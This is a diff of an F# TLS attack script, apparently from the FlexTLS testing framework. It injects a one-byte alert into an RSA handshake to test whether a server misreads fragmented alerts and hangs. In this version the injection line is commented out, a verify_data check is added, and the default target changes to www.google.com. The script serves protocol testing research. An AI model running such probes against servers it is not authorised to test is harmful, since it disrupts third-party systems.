@@ -1,4 +1,6 @@
-﻿module Attacks
+﻿#light "off"
+
+module Attacks
 
 open FlexTypes
 open FlexConnection
@@ -13,20 +15,24 @@ open FlexCCS
 open FlexFinished
 open FlexRecord
 open FlexAppData
+open FlexSecrets
 
 open Bytes
 open TLSInfo
 
-let alertAttack peer name =
+let httpRequest host =
+    sprintf "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n" host
+
+let alertAttack peer =
     // Connect to the server
-    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,name) in
+    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,peer) in
 
     // Start a typical RSA handshake with the server
     let st,nsc,ch = FlexClientHello.send(st) in
     let st,nsc,sh = FlexServerHello.receive(st,nsc) in
 
     // *** Inject a one byte alert on behalf of the attacker ***
-    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in
+    //let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in
 
     // Continue the typical RSA handshake
     let st,nsc,cert = FlexCertificate.receive(st,Client,nsc) in
@@ -42,19 +48,18 @@ let alertAttack peer name =
     let st,_        = FlexCCS.receive(st) in
 
     // Start decrypting
-    let st           = FlexState.installReadKeys st nsc in
-    // let log       = log @| fcf.payload
-
+    let st          = FlexState.installReadKeys st nsc in
     // Check that verify_data is correct
-    let st,fsf       = FlexFinished.receive(st) in
+    let vd = FlexSecrets.makeVerifyData nsc.si nsc.ms Server (log @| cf.payload) in
+    let st,sf       = FlexFinished.receive(st) in
+    if not (vd = sf.verify_data) then
+        failwith "Verify_data check failed"
+    else
 
     // RSA handshake is over. Send some plaintext
-    let request = sprintf "GET / HTTP/1.1\r\nConnection: Keep-Alive\r\n\r\n" in
+    let request = httpRequest peer in
     let st = FlexAppData.send(st,request) in
     printf "---> %s" request;
-    let st,b = FlexAppData.receive(st) in
-    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
-    printf "<--- %s" response;
     let st,b = FlexAppData.receive(st) in
     let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
     printf "<--- %s" response;
@@ -66,7 +71,7 @@ let alertAttack peer name =
            or the connection to be shut down.
            However, the peer mis-interpreted our alert, and is now
            waiting for more data. *)
-    printf "Sending close notify. Going to hang...\n"
+    printf "Sending close notify. Going to hang...\n";
     let st,ad = FlexAlert.receive(st) in
     printf "Alert: %A" ad;
     ignore (System.Console.ReadLine());
@@ -74,5 +79,5 @@ let alertAttack peer name =
 
 [<EntryPoint>]
 let main argv = 
-    alertAttack "www.inria.fr" "www.inria.fr"
+    alertAttack "www.google.com";
     0
